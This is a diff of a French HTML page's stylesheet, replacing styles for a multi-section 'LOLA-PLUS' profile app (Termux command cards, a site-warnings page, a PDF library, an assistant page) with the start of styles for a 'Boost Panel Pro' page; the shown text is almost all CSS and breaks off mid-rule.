@@ -2,2361 +2,790 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LOLA-PLUS — Profil</title>
-    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Boost Panel Pro</title>
     <style>
-        :root {
-            --bg: #050505;
-            --card-bg: #050505;
-            --accent: #00ff41;
-            --text: #777777;
-            --border: #1a2a1a;
-            --sidebar-bg: #0a0a0a;
-            --sidebar-text: #00ff41;
-            --input-bg: #000;
-        }
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body {
-            background: var(--bg);
-            color: var(--text);
-            font-family: 'Share Tech Mono', monospace;
-            padding: 20px;
-            transition: background 0.3s, color 0.3s;
-        }
-        body.light-mode {
-            --bg: #f0f0f0;
-            --card-bg: #ffffff;
-            --text: #222222;
-            --border: #cccccc;
-            --accent: #0066cc;
-            --sidebar-bg: #e0e0e0;
-            --sidebar-text: #0066cc;
-            --input-bg: #ffffff;
-        }
-
-        /* ===== BARRE DE PROGRESSION ===== */
-        #progress-bar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 0%;
-            height: 3px;
-            background: linear-gradient(90deg, #00ff41, #00b4d8, #00ff41);
-            z-index: 9999;
-            transition: width 0.3s ease;
-            box-shadow: 0 0 15px rgba(0, 255, 65, 0.6);
-            border-radius: 0 2px 2px 0;
-            display: none;
-        }
-        #progress-bar.loading {
-            width: 70%;
-        }
-        #progress-bar.complete {
-            width: 100%;
-        }
-
-        /* ===== TOAST NOTIFICATIONS ===== */
-        #toast-container {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            z-index: 10000;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            max-width: 350px;
-            width: 100%;
-            pointer-events: none;
-        }
-        .toast {
-            padding: 14px 20px;
-            border-radius: 8px;
-            color: #fff;
-            font-size: 13px;
-            font-family: 'Share Tech Mono', monospace;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            animation: slideIn 0.4s ease, fadeOut 0.4s ease 2.8s forwards;
-            pointer-events: auto;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.05);
-        }
-        .toast.success { background: rgba(0, 255, 65, 0.15); border-left: 4px solid #00ff41; color: #00ff41; }
-        .toast.error { background: rgba(255, 50, 50, 0.15); border-left: 4px solid #ff4444; color: #ff4444; }
-        .toast.info { background: rgba(0, 180, 216, 0.15); border-left: 4px solid #00b4d8; color: #00b4d8; }
-
-        @keyframes slideIn {
-            from { transform: translateX(100px); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-        @keyframes fadeOut {
-            to { opacity: 0; transform: translateY(-20px); }
-        }
-
-        .nav-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; font-size: 12px; color: var(--accent); }
-        .btn-signup { border: 1px solid var(--accent); color: var(--accent); padding: 5px 10px; cursor: pointer; background: transparent; font-family: inherit; }
-        .nav-back { display: none; margin-bottom: 30px; color: var(--accent); cursor: pointer; font-size: 12px; }
-        .hero { text-align: center; margin-bottom: 40px; background: var(--bg); }
-        .badge { border: 1px solid var(--accent); color: var(--accent); padding: 4px 10px; font-size: 8px; display: inline-block; margin-bottom: 15px; }
-        h1 { font-size: 24px; color: var(--accent); margin: 10px 0; letter-spacing: 2px; }
-        .hero p { font-size: 11px; margin-bottom: 20px; color: #555; }
-        .btn-main { background: var(--accent); color: black; padding: 12px 20px; border: none; font-weight: bold; width: 250px; display: block; margin: 10px auto; cursor: pointer; font-family: inherit; }
-        .btn-sec { background: transparent; border: 1px solid var(--accent); color: var(--accent); padding: 10px 20px; width: 250px; margin: 0 auto; cursor: pointer; font-family: inherit; }
-        .terminal-mock { background: #000; border: 1px solid #1a2a1a; margin: 40px auto; padding: 15px; text-align: left; font-size: 10px; color: var(--accent); max-width: 500px; }
-        .feature-box { border: 1px solid var(--border); padding: 20px; margin: 15px auto; max-width: 500px; text-align: left; background: #0a1a0a; cursor: pointer; transition: 0.2s; border-radius: 4px; }
-        .feature-box:hover { background: #112211; border-color: var(--accent); box-shadow: 0 0 10px rgba(0, 255, 65, 0.1); }
-        .feature-box div { color: var(--accent); margin-bottom: 8px; }
-        .feature-box h3 { font-size: 14px; color: #eee; margin-bottom: 5px; }
-        .feature-box p { font-size: 10px; color: #555; }
-        .stats-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 0; border: 1px solid var(--border); max-width: 500px; margin: 40px auto; background: var(--card-bg); }
-        .stat-box { border: 1px solid var(--border); padding: 20px 10px; text-align: center; color: var(--accent); background: #0a0f0a; cursor: pointer; transition: 0.2s; }
-        .stat-box:hover { background: #112211; border-color: var(--accent); }
-        .stat-box strong { display: block; font-size: 16px; }
-        .stat-box span { font-size: 8px; color: #888; }
-        .about-section { padding: 40px 20px; text-align: center; max-width: 600px; margin: 20px auto; font-size: 11px; line-height: 1.4; color: #555; background: var(--card-bg); }
-        .footer { text-align: center; padding: 40px 20px; font-size: 10px; color: #333; background: var(--bg); }
-        .footer-links { margin-bottom: 15px; }
-        .footer-links a { color: #333; text-decoration: none; margin: 0 10px; }
-        .page-container { display: none; max-width: 500px; margin: 0 auto; color: var(--text); }
-        .form-group { margin-bottom: 20px; }
-        .form-group label { display: block; font-size: 10px; color: var(--accent); margin-bottom: 5px; }
-        .form-group input, .form-group select { width: 100%; background: var(--input-bg); border: 1px solid var(--border); padding: 10px; color: #fff; font-family: inherit; }
-        .btn-submit { background: var(--accent); color: black; padding: 12px; width: 100%; border: none; font-weight: bold; cursor: pointer; font-family: inherit; }
-        .burger-menu { cursor: pointer; margin-bottom: 20px; position: relative; z-index: 10; }
-        .burger-bar { width: 25px; height: 3px; background: var(--accent); margin: 5px 0; transition: 0.3s; }
-        .profile-pic-box { width: 100px; height: 100px; border: 1px dashed var(--accent); margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; color: var(--accent); cursor: pointer; font-size: 40px; overflow: hidden; border-radius: 50%; }
-        .profile-pic-box img { width: 100%; height: 100%; object-fit: cover; }
-        .name-rect { border: 1px solid var(--accent); padding: 15px; text-align: center; margin-bottom: 20px; color: #fff; background: #0a0f0a; }
-        .menu-option { border: 1px solid var(--accent); padding: 15px; margin-bottom: 10px; color: var(--accent); text-align: center; cursor: pointer; }
-        .error-msg { color: #ff4444; font-size: 10px; margin-top: -10px; margin-bottom: 15px; display: none; }
-
-        /* Sidebar */
-        .sidebar { position: fixed; top: 0; left: -250px; width: 250px; height: 100%; background: var(--sidebar-bg); padding-top: 60px; transition: 0.3s; z-index: 1000; border-right: 1px solid var(--accent); }
-        .sidebar.active { left: 0; }
-        .sidebar a { display: block; padding: 15px 25px; color: var(--sidebar-text); text-decoration: none; font-size: 14px; border-bottom: 1px solid var(--border); cursor: pointer; }
-        .sidebar a:hover { background: var(--accent); color: #000; }
-        .sidebar a.logout { border-top: 1px solid var(--border); margin-top: 20px; color: #ff4444; }
-        .sidebar a.logout:hover { background: rgba(255, 50, 50, 0.2); }
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 999; display: none; }
-        .overlay.active { display: block; }
-        .close-btn { position: absolute; top: 10px; right: 20px; font-size: 24px; color: var(--accent); cursor: pointer; }
-
-        /* Paramètres */
-        .settings-section { margin-bottom: 30px; }
-        .settings-section h2 { color: var(--accent); font-size: 14px; margin-bottom: 15px; border-bottom: 1px solid var(--border); padding-bottom: 10px; }
-        .lang-option { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid var(--border); cursor: pointer; }
-        .lang-option:hover { background: rgba(0,255,65,0.05); }
-        .lang-option span { font-size: 12px; }
-        .lang-option .check { color: var(--accent); font-size: 16px; }
-        .lang-option .check.inactive { color: #555; }
-        .security-field { margin-bottom: 15px; }
-        .security-field label { display: block; font-size: 10px; color: var(--accent); margin-bottom: 5px; }
-        .security-field input { width: 100%; background: var(--input-bg); border: 1px solid var(--border); padding: 10px; color: #fff; font-family: inherit; }
-        .btn-change-pwd { background: var(--accent); color: black; padding: 10px; width: 100%; border: none; font-weight: bold; cursor: pointer; font-family: inherit; margin-top: 10px; }
-        .btn-2fa { background: transparent; border: 1px solid var(--accent); color: var(--accent); padding: 10px; width: 100%; cursor: pointer; font-family: inherit; margin-top: 10px; }
-        .status-2fa { font-size: 12px; color: #888; margin-top: 5px; }
-        .status-2fa .inactive { color: #ff4444; }
-        .status-2fa .active { color: var(--accent); }
-        .toggle-indicator { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 8px; }
-        .toggle-indicator.off { background: #ff4444; }
-        .toggle-indicator.on { background: var(--accent); }
-
-        /* Page Termux (intégrée) */
-        .termux-page {
-            display: none;
-            background: #0a0c10;
-            color: #c9d6e3;
-            font-family: 'Rajdhani', sans-serif;
+            background: #0b0f1a;
+            font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
+            color: #e8ecf1;
+            padding: 16px;
             min-height: 100vh;
-            padding: 0 0 60px;
-            max-width: 100%;
-        }
-        .termux-page .termux-header {
-            position: relative;
-            padding: 48px 24px 32px;
-            text-align: center;
-            border-bottom: 1px solid #1e2840;
-            overflow: hidden;
-        }
-        .termux-page .termux-header::after {
-            content: '';
-            position: absolute;
-            bottom: 0; left: 0; right: 0;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, #00f5a0, #00b4d8, transparent);
-        }
-        .termux-page .termux-logo {
-            font-family: 'Share Tech Mono', monospace;
-            font-size: clamp(28px, 6vw, 52px);
-            color: #00f5a0;
-            letter-spacing: 4px;
-            text-shadow: 0 0 30px rgba(0,245,160,0.5), 0 0 60px rgba(0,245,160,0.2);
-            position: relative;
-            animation: flicker 6s infinite;
-        }
-        .termux-page .termux-logo span { color: #00b4d8; }
-        .termux-page .termux-subtitle {
-            font-size: 13px;
-            color: #4a5a70;
-            letter-spacing: 3px;
-            text-transform: uppercase;
-            margin-top: 8px;
-            font-weight: 300;
-        }
-        .termux-page .termux-stats {
             display: flex;
             justify-content: center;
-            gap: 32px;
-            margin-top: 20px;
-            flex-wrap: wrap;
-        }
-        .termux-page .termux-stat {
-            font-family: 'Share Tech Mono', monospace;
-            font-size: 11px;
-            color: #4a5a70;
-            letter-spacing: 2px;
-        }
-        .termux-page .termux-stat strong {
-            color: #00f5a0;
-            font-size: 16px;
-            display: block;
-        }
-        .termux-page .filters {
-            display: flex;
-            gap: 8px;
-            padding: 20px 24px;
-            overflow-x: auto;
-            border-bottom: 1px solid #1e2840;
-            scrollbar-width: none;
-        }
-        .termux-page .filters::-webkit-scrollbar { display: none; }
-        .termux-page .filter-btn {
-            flex-shrink: 0;
-            padding: 6px 16px;
-            border: 1px solid #1e2840;
-            background: transparent;
-            color: #4a5a70;
-            font-family: 'Share Tech Mono', monospace;
-            font-size: 11px;
-            letter-spacing: 1px;
-            cursor: pointer;
-            border-radius: 2px;
-            transition: all 0.2s;
-            text-transform: uppercase;
-        }
-        .termux-page .filter-btn:hover, .termux-page .filter-btn.active {
-            border-color: #00f5a0;
-            color: #00f5a0;
-            background: rgba(0,245,160,0.06);
-        }
-        .termux-page .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
-            gap: 1px;
-            background: #1e2840;
-            margin: 1px;
-        }
-        .termux-page .card {
-            background: #0f1319;
-            padding: 20px;
-            position: relative;
-            overflow: hidden;
-            transition: background 0.2s;
-            cursor: pointer;
-        }
-        .termux-page .card:hover { background: #131820; }
-        .termux-page .card::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0;
-            width: 3px;
-            height: 100%;
-            opacity: 0;
-            transition: opacity 0.2s;
-        }
-        .termux-page .card:hover::before { opacity: 1; }
-        .termux-page .card[data-cat="install"]::before { background: #00f5a0; }
-        .termux-page .card[data-cat="réseau"]::before { background: #00b4d8; }
-        .termux-page .card[data-cat="fichiers"]::before { background: #ffd60a; }
-        .termux-page .card[data-cat="système"]::before { background: #f72585; }
-        .termux-page .card[data-cat="outils"]::before { background: #b388ff; }
-        .termux-page .card[data-cat="hacking"]::before { background: #ff6b6b; }
-        .termux-page .card-num {
-            font-family: 'Share Tech Mono', monospace;
-            font-size: 10px;
-            color: #4a5a70;
-            margin-bottom: 6px;
-            letter-spacing: 1px;
-        }
-        .termux-page .card-title {
-            font-size: 15px;
-            font-weight: 700;
-            color: #e8f0fe;
-            margin-bottom: 8px;
-            letter-spacing: 0.5px;
-        }
-        .termux-page .card-code {
-            font-family: 'Share Tech Mono', monospace;
-            font-size: 12px;
-            background: rgba(0,0,0,0.4);
-            border: 1px solid #1e2840;
-            border-radius: 3px;
-            padding: 10px 12px;
-            color: #00f5a0;
-            line-height: 1.7;
-            word-break: break-all;
-            position: relative;
-            white-space: pre-wrap;
-        }
-        .termux-page .card[data-cat="réseau"] .card-code { color: #00b4d8; }
-        .termux-page .card[data-cat="fichiers"] .card-code { color: #ffd60a; }
-        .termux-page .card[data-cat="système"] .card-code { color: #ff8fa3; }
-        .termux-page .card[data-cat="outils"] .card-code { color: #b388ff; }
-        .termux-page .card[data-cat="hacking"] .card-code { color: #ff6b6b; }
-        .termux-page .card-desc {
-            font-size: 12px;
-            color: #4a5a70;
-            margin-top: 8px;
-            line-height: 1.5;
-            font-weight: 300;
-        }
-        .termux-page .card-tag {
-            display: inline-block;
-            font-size: 9px;
-            font-family: 'Share Tech Mono', monospace;
-            letter-spacing: 1.5px;
-            text-transform: uppercase;
-            padding: 2px 7px;
-            border-radius: 2px;
-            margin-bottom: 8px;
-        }
-        .termux-page .card[data-cat="install"] .card-tag { background: rgba(0,245,160,0.1); color: #00f5a0; }
-        .termux-page .card[data-cat="réseau"] .card-tag { background: rgba(0,180,216,0.1); color: #00b4d8; }
-        .termux-page .card[data-cat="fichiers"] .card-tag { background: rgba(255,214,10,0.1); color: #ffd60a; }
-        .termux-page .card[data-cat="système"] .card-tag { background: rgba(247,37,133,0.12); color: #f72585; }
-        .termux-page .card[data-cat="outils"] .card-tag { background: rgba(179,136,255,0.1); color: #b388ff; }
-        .termux-page .card[data-cat="hacking"] .card-tag { background: rgba(255,107,107,0.1); color: #ff6b6b; }
-        .termux-page .copy-btn {
-            position: absolute;
-            top: 6px; right: 6px;
-            background: rgba(0,245,160,0.08);
-            border: 1px solid rgba(0,245,160,0.2);
-            color: #00f5a0;
-            font-family: 'Share Tech Mono', monospace;
-            font-size: 9px;
-            padding: 3px 7px;
-            cursor: pointer;
-            border-radius: 2px;
-            letter-spacing: 1px;
-            transition: all 0.15s;
-            text-transform: uppercase;
-        }
-        .termux-page .copy-btn:hover { background: rgba(0,245,160,0.15); }
-        .termux-page .copy-btn.copied { color: #ffd60a; border-color: #ffd60a; background: rgba(255,214,10,0.08); }
-        .termux-page .termux-footer {
-            text-align: center;
-            padding: 40px 24px 0;
-            font-family: 'Share Tech Mono', monospace;
-            font-size: 11px;
-            color: #4a5a70;
-            letter-spacing: 2px;
-        }
-        .termux-page .hidden { display: none !important; }
-        @keyframes flicker {
-            0%,95%,100% { opacity: 1; }
-            96% { opacity: 0.85; }
-            97% { opacity: 1; }
-            98% { opacity: 0.9; }
-        }
-
-        /* ========== STYLE POUR LA PAGE SITES À CONNAITRE ========== */
-        .sites-page {
-            display: none;
-            background: #0b1120;
-            min-height: 100vh;
-            padding: 20px;
-            max-width: 800px;
-            margin: 0 auto;
-        }
-        .sites-page .card {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(18px);
-            -webkit-backdrop-filter: blur(18px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 40px;
-            padding: 30px 25px 35px;
-            max-width: 800px;
-            width: 100%;
-            box-shadow: 0 25px 50px -10px rgba(0, 0, 0, 0.7);
-        }
-        .sites-page .credit {
-            text-align: center;
-            color: #6688aa;
-            font-size: 0.75rem;
-            letter-spacing: 1px;
-            margin-bottom: 6px;
-            opacity: 0.7;
-            font-weight: 300;
-        }
-        .sites-page h1 {
-            text-align: center;
-            font-size: 2rem;
-            font-weight: 700;
-            color: #f0f4ff;
-            text-shadow: 0 2px 12px rgba(255, 100, 100, 0.25);
-            padding-bottom: 12px;
-            border-bottom: 2px solid rgba(255, 100, 100, 0.15);
-            margin-bottom: 8px;
-        }
-        .sites-page h1 span {
-            background: linear-gradient(135deg, #ff6b6b, #ffa94d);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .sites-page .sous-titre {
-            text-align: center;
-            color: #8899bb;
-            font-size: 0.9rem;
-            margin-bottom: 20px;
-            padding: 0 10px;
-        }
-        .sites-page .alerte {
-            background: rgba(255, 50, 50, 0.08);
-            border: 1px solid rgba(255, 50, 50, 0.15);
-            border-radius: 16px;
-            padding: 12px 16px;
-            margin-bottom: 22px;
-            color: #ff9999;
-            font-size: 0.8rem;
-            text-align: center;
-            line-height: 1.5;
-        }
-        .sites-page .grid-boutons {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 12px;
-        }
-        .sites-page .btn-site {
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.07);
-            border-radius: 16px;
-            padding: 16px 8px;
-            font-size: 0.9rem;
-            font-weight: 600;
-            color: #e8edff;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-            text-align: center;
-            backdrop-filter: blur(4px);
-            -webkit-backdrop-filter: blur(4px);
-            line-height: 1.4;
-        }
-        .sites-page .btn-site .sous-nom {
-            display: block;
-            font-size: 0.65rem;
-            font-weight: 400;
-            color: #8899bb;
-            margin-top: 4px;
-        }
-        .sites-page .btn-site:active {
-            transform: scale(0.94);
-        }
-        .sites-page .btn-site.danger {
-            border-left: 3px solid #ff6b6b;
-        }
-        .sites-page .btn-site.danger:active {
-            background: rgba(255, 50, 50, 0.15);
-            border-color: rgba(255, 50, 50, 0.3);
-        }
-        .sites-page .btn-site.phishing {
-            border-left: 3px solid #ffa94d;
-        }
-        .sites-page .btn-site.phishing:active {
-            background: rgba(255, 170, 50, 0.15);
-            border-color: rgba(255, 170, 50, 0.3);
-        }
-        .sites-page .btn-site.tracking {
-            border-left: 3px solid #ffd93d;
-        }
-        .sites-page .btn-site.tracking:active {
-            background: rgba(255, 220, 50, 0.15);
-            border-color: rgba(255, 220, 50, 0.3);
-        }
-        .sites-page .btn-site.malware {
-            border-left: 3px solid #ff6bff;
-        }
-        .sites-page .btn-site.malware:active {
-            background: rgba(255, 100, 255, 0.15);
-            border-color: rgba(255, 100, 255, 0.3);
-        }
-        .sites-page .btn-site.fake {
-            border-left: 3px solid #6bcbff;
-        }
-        .sites-page .btn-site.fake:active {
-            background: rgba(100, 200, 255, 0.15);
-            border-color: rgba(100, 200, 255, 0.3);
-        }
-        .sites-page .info-box {
-            margin-top: 22px;
-            padding: 16px 18px;
-            background: rgba(0, 0, 0, 0.4);
-            border-radius: 20px;
-            border-left: 4px solid #ff6b6b;
-            color: #c8d6ff;
-            font-size: 0.9rem;
-            min-height: 70px;
-            display: flex;
             align-items: center;
-            word-break: break-word;
-            flex-wrap: wrap;
-            gap: 6px;
         }
-        .sites-page .info-box .emoji {
-            margin-right: 10px;
-            font-size: 1.5rem;
-        }
-        .sites-page .info-box .message {
-            flex: 1;
-            line-height: 1.6;
-        }
-        .sites-page .info-box a {
-            color: #7aaaff;
-            text-decoration: none;
-            border-bottom: 1px solid rgba(122, 170, 255, 0.3);
-            margin: 0 4px;
-            padding: 2px 0;
-            font-weight: 500;
-        }
-        .sites-page .info-box a:active {
-            color: #a78bfa;
-        }
-        .sites-page .info-box .lien-texte {
-            background: rgba(122, 170, 255, 0.08);
-            padding: 2px 10px;
-            border-radius: 8px;
-            font-size: 0.75rem;
-            color: #8899bb;
-            word-break: break-all;
-            display: inline-block;
-            margin-top: 4px;
-        }
-        .sites-page .info-box .danger-label {
-            background: rgba(255, 50, 50, 0.15);
-            color: #ff7777;
-            padding: 2px 10px;
-            border-radius: 20px;
-            font-size: 0.65rem;
-            font-weight: 600;
-            display: inline-block;
-            margin-right: 6px;
-        }
-        .sites-page .avertissement {
-            margin-top: 18px;
-            padding: 12px 16px;
-            background: rgba(255, 200, 50, 0.06);
-            border-radius: 16px;
-            border: 1px solid rgba(255, 200, 50, 0.1);
-            color: #aabbdd;
-            font-size: 0.7rem;
-            text-align: center;
-            line-height: 1.6;
-        }
-        .sites-page .avertissement strong {
-            color: #ffaa66;
-        }
-        .sites-page .footer-message {
-            margin-top: 18px;
-            padding: 14px 16px;
-            background: rgba(100, 200, 255, 0.04);
-            border-radius: 16px;
-            border: 1px solid rgba(100, 200, 255, 0.06);
-            color: #88bbdd;
-            font-size: 0.85rem;
-            text-align: center;
-            line-height: 1.6;
-            font-style: italic;
-            letter-spacing: 0.3px;
-        }
-        .sites-page .footer-message span {
-            color: #66ccff;
-            font-weight: 500;
-        }
-        @media (max-width: 480px) {
-            .sites-page .card { padding: 18px 12px 22px; border-radius: 28px; }
-            .sites-page h1 { font-size: 1.3rem; }
-            .sites-page .grid-boutons { grid-template-columns: 1fr 1fr; gap: 8px; }
-            .sites-page .btn-site { padding: 12px 6px; font-size: 0.75rem; }
-            .sites-page .btn-site .sous-nom { font-size: 0.55rem; }
-            .sites-page .info-box { font-size: 0.8rem; padding: 12px; min-height: 55px; }
-            .sites-page .sous-titre { font-size: 0.75rem; }
-            .sites-page .alerte { font-size: 0.7rem; padding: 10px 12px; }
-            .sites-page .footer-message { font-size: 0.7rem; padding: 12px; }
-            .sites-page .credit { font-size: 0.6rem; }
-        }
-        @media (max-width: 380px) {
-            .sites-page .grid-boutons { grid-template-columns: 1fr 1fr; gap: 6px; }
-            .sites-page .btn-site { font-size: 0.65rem; padding: 10px 4px; }
-        }
-
-        /* ========== STYLE POUR LA PAGE BIBLIOTHÈQUE PDF ========== */
-        .pdf-page {
-            display: none;
-            background: #0b1120;
-            min-height: 100vh;
-            padding: 20px;
-            max-width: 700px;
-            margin: 0 auto;
-        }
-        .pdf-page .card {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(18px);
-            -webkit-backdrop-filter: blur(18px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 40px;
-            padding: 30px 25px 35px;
-            max-width: 700px;
+        .container {
+            max-width: 480px;
             width: 100%;
-            box-shadow: 0 25px 50px -10px rgba(0, 0, 0, 0.7);
+            background: #131a2b;
+            border-radius: 32px;
+            padding: 28px 20px 24px;
+            border: 1px solid #1f2a40;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
         }
-        .pdf-page .credit {
-            text-align: center;
-            color: #6688aa;
-            font-size: 0.7rem;
-            letter-spacing: 1px;
-            margin-bottom: 4px;
-            opacity: 0.6;
-            font-weight: 300;
-        }
-        .pdf-page h1 {
-            text-align: center;
-            font-size: 1.8rem;
-            font-weight: 700;
-            color: #f0f4ff;
-            text-shadow: 0 2px 12px rgba(100, 200, 255, 0.2);
-            padding-bottom: 12px;
-            border-bottom: 2px solid rgba(255, 255, 255, 0.06);
-            margin-bottom: 6px;
-        }
-        .pdf-page h1 span {
-            background: linear-gradient(135deg, #60b0ff, #a78bfa);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .pdf-page .sous-titre {
-            text-align: center;
-            color: #8899bb;
-            font-size: 0.8rem;
-            margin-bottom: 22px;
-        }
-        .pdf-page .pdf-list {
+        .header {
             display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-bottom: 18px;
-        }
-        .pdf-page .pdf-item {
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 18px;
-            padding: 16px 18px;
-            display: flex;
-            align-items: center;
             justify-content: space-between;
-            gap: 12px;
-            transition: 0.2s;
-            animation: fadeIn 0.3s ease;
-        }
-        .pdf-page .pdf-item .info {
-            display: flex;
             align-items: center;
-            gap: 14px;
-            flex: 1;
-            min-width: 0;
+            margin-bottom: 16px;
         }
-        .pdf-page .pdf-item .info .pdf-icon {
-            font-size: 2rem;
-            flex-shrink: 0;
-        }
-        .pdf-page .pdf-item .info .details {
-            flex: 1;
-            min-width: 0;
-        }
-        .pdf-page .pdf-item .info .nom {
-            color: #e8edff;
-            font-weight: 600;
-            font-size: 0.95rem;
-        }
-        .pdf-page .pdf-item .info .description {
-            color: #7788aa;
-            font-size: 0.75rem;
-            margin-top: 2px;
-        }
-        .pdf-page .pdf-item .actions {
-            display: flex;
-            gap: 8px;
-            flex-shrink: 0;
-        }
-        .pdf-page .pdf-item .actions button {
-            border: none;
-            border-radius: 12px;
-            padding: 8px 16px;
-            font-size: 0.8rem;
-            font-weight: 500;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        .pdf-page .pdf-item .actions button:active {
-            transform: scale(0.92);
-        }
-        .pdf-page .pdf-item .actions .btn-ouvrir {
-            background: rgba(96, 176, 255, 0.2);
-            color: #7aaaff;
-            border: 1px solid rgba(96, 176, 255, 0.15);
-        }
-        .pdf-page .pdf-item .actions .btn-ouvrir:active {
-            background: rgba(96, 176, 255, 0.35);
-        }
-        .pdf-page .pdf-item .actions .btn-telecharger {
-            background: rgba(100, 255, 150, 0.1);
-            color: #66ddaa;
-            border: 1px solid rgba(100, 255, 150, 0.1);
-        }
-        .pdf-page .pdf-item .actions .btn-telecharger:active {
-            background: rgba(100, 255, 150, 0.25);
-        }
-        .pdf-page .drop-zone {
-            border: 2px dashed rgba(255, 255, 255, 0.08);
-            border-radius: 20px;
-            padding: 20px 15px;
-            text-align: center;
-            color: #556688;
-            transition: all 0.3s ease;
-            cursor: pointer;
-            background: rgba(255, 255, 255, 0.02);
-            margin-top: 18px;
-            position: relative;
-        }
-        .pdf-page .drop-zone.dragover {
-            border-color: #60b0ff;
-            background: rgba(96, 176, 255, 0.06);
-        }
-        .pdf-page .drop-zone .icon {
-            font-size: 1.8rem;
-            display: block;
-            margin-bottom: 4px;
-        }
-        .pdf-page .drop-zone .texte {
-            font-size: 0.8rem;
-        }
-        .pdf-page .drop-zone .sous-texte {
-            font-size: 0.65rem;
-            color: #445566;
-            margin-top: 4px;
-        }
-        .pdf-page .drop-zone input[type="file"] {
-            position: absolute;
-            inset: 0;
-            opacity: 0;
-            cursor: pointer;
-        }
-        .pdf-page .compteur {
-            text-align: center;
-            color: #556688;
-            font-size: 0.7rem;
-            margin-top: 10px;
-        }
-        .pdf-page .compteur span {
-            color: #8899bb;
-            font-weight: 600;
-        }
-        .pdf-page .footer-message {
-            margin-top: 20px;
-            padding: 14px 16px;
-            background: rgba(100, 200, 255, 0.04);
-            border-radius: 16px;
-            border: 1px solid rgba(100, 200, 255, 0.06);
-            color: #88bbdd;
-            font-size: 0.8rem;
-            text-align: center;
-            line-height: 1.6;
-            font-style: italic;
-            letter-spacing: 0.3px;
-        }
-        .pdf-page .footer-message span {
-            color: #66ccff;
-            font-weight: 500;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-8px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        @media (max-width: 480px) {
-            .pdf-page .card { padding: 20px 14px 25px; border-radius: 28px; }
-            .pdf-page h1 { font-size: 1.3rem; }
-            .pdf-page .pdf-item { padding: 14px 14px; flex-wrap: wrap; }
-            .pdf-page .pdf-item .info .nom { font-size: 0.85rem; }
-            .pdf-page .pdf-item .actions button { font-size: 0.7rem; padding: 6px 12px; }
-            .pdf-page .pdf-item .info .pdf-icon { font-size: 1.5rem; }
-        }
-        @media (max-width: 380px) {
-            .pdf-page .pdf-item .actions { flex-wrap: wrap; width: 100%; }
-            .pdf-page .pdf-item .actions button { flex: 1; text-align: center; }
-        }
-
-        /* ========== STYLE POUR LA PAGE ASSISTANCE (IA Hack & Code) ========== */
-        .assistance-page {
-            display: none;
-            background: #0b1120;
-            min-height: 100vh;
-            padding: 20px;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-        .assistance-page .card {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(18px);
-            -webkit-backdrop-filter: blur(18px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 40px;
-            padding: 30px 25px 35px;
-            max-width: 600px;
-            width: 100%;
-            box-shadow: 0 25px 50px -10px rgba(0, 0, 0, 0.7);
-        }
-        .assistance-page .credit {
-            text-align: center;
-            color: #6688aa;
-            font-size: 0.7rem;
-            letter-spacing: 1px;
-            margin-bottom: 4px;
-            opacity: 0.6;
-            font-weight: 300;
-        }
-        .assistance-page h1 {
-            text-align: center;
-            font-size: 1.8rem;
+        .header h1 {
+            font-size: 22px;
             font-weight: 700;
-            color: #f0f4ff;
-            text-shadow: 0 2px 12px rgba(0, 255, 200, 0.15);
-            padding-bottom: 12px;
-            border-bottom: 2px solid rgba(0, 255, 200, 0.08);
-            margin-bottom: 6px;
-        }
-        .assistance-page h1 span {
-            background: linear-gradient(135deg, #00d4aa, #00b4ff);
+            background: linear-gradient(135deg, #f7c948, #f59e0b);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
-        .assistance-page .sous-titre {
-            text-align: center;
-            color: #8899bb;
-            font-size: 0.8rem;
-            margin-bottom: 22px;
+        .header span { font-size: 12px; color: #6b7a93; background: #1f2a40; padding: 4px 12px; border-radius: 30px; }
+
+        .progress-wrapper {
+            width: 100%;
+            height: 4px;
+            background: #1f2a40;
+            border-radius: 4px;
